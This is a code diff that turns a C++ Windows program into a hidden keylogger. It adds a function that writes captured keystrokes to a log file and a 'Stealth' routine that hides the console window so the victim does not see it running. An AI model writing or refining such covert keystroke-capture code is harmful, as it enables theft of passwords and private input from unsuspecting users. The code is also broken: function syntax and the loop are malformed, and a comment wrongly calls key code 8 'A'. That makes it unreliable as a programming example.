@@ -6,30 +6,74 @@ using namespace std;
 
 // global variable to store keystroke
 
-char key;
+int SaveLogs (int key_stroke, char *file);
+    {
+        if((key_stroke == 1) || (key_stroke == 2))
+            return 0;
 
-// function to log the keystrokes
+        FILE *OUTPUT_FILE;
+        OUTPUT_FILE = fopen(file, "a");
 
-void logKeystroke()
-{
-    // get the keystroke using the GetAsyncKeyState() function
-    
-    // key = GetAsyncKeyState(VK_LBUTTON);
-    
-    key = GetKeyState('A') & 0x8000;
+        cout << key_stroke << endl;
 
-    // print the keystroke
-    cout << key;
+        if(key_stroke == 8) // number stands for ascii value 8 = "A"
+            fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+                else if (key_stroke == 13)
+                    fprintf(OUTPUT_FILE,"%s", "n");
+                else if (key_stroke == 32)
+                    fprintf(OUTPUT_FILE,"%s", "");   
+                else if (key_stroke == VK_TAB)
+                    fprintf(OUTPUT_FILE,"%s", "[TAB]");
+                else if (key_stroke == VK_SHIFT)
+                    fprintf(OUTPUT_FILE,"%s", "[SHIFT]");
+                else if (key_stroke == VK_CONTROL)
+                    fprintf(OUTPUT_FILE,"%s", "[CONTROL]");
+                else if (key_stroke == VK_ESCAPE)
+                    fprintf(OUTPUT_FILE,"%s", "[ESCAPE]");
+                else if (key_stroke == VK_END)
+                    fprintf(OUTPUT_FILE,"%s", "[END]");
+                else if (key_stroke == VK_HOME)
+                    fprintf(OUTPUT_FILE,"%s", "[HOME]");
+                else if (key_stroke == VK_LEFT)
+                    fprintf(OUTPUT_FILE,"%s", "[LEFT]");
+                else if (key_stroke == VK_UP)
+                    fprintf(OUTPUT_FILE,"%s", "[UP]");
+                else if (key_stroke == VK_RIGHT)
+                    fprintf(OUTPUT_FILE,"%s", "[RIGHT]"); 
+                else if (key_stroke == VK_DOWN)
+                    fprintf(OUTPUT_FILE,"%s", "[DOWN]");     
+                else if(key_stroke == 190 || key_stroke == 110)
+                    fprintf(OUTPUT_FILE,"%s", ".");
+                else
+                    fprintf(OUTPUT_FILE, "%s", &key_stroke);
+        fclose(OUTPUT_FILE);
+        return 0;                                          
 }
+
+void Stealth(); // Declare stealth function to be hidden
+{
+    HWND Stealth;
+    AllocConsole();
+    Stealth = FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow(Stealth,0);
+}
+
+// Main function:
 
 int main()
 {
-    // infinite loop to log the keystrokes
-    while(true);
+    Stealth(); // Call Stealth function
+    char i; // Declare 'i' from type 'char'
+
+    while(1)
     {
-        // call the logKeyStroke() function
-        logKeystroke();
+        for(i=8, i <= 190; i);
+            {
+                if(GetAsyncKeyState(i) == -32767)
+                    SaveLogs(i,"MYLOGS.txt");
+            }
     }
+    system("PAUSE");
 return 0;
 }
 
